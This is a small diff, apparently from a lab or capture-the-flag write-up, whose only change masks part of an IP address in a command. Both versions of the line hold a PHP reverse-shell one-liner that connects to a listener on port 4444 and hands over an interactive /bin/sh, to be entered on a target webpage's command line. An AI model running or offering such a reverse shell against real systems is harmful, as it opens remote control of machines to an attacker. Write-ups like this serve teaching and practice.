@@ -118,7 +118,7 @@ b'-VkgXhFf6sAEcAwrC6YR-S************
   On the webpage command line:
 
     ```
-    php -r '$sock=fsockopen("10.21.157.185",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+    php -r '$sock=fsockopen("10.21.15*.***",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
     ```
 
 
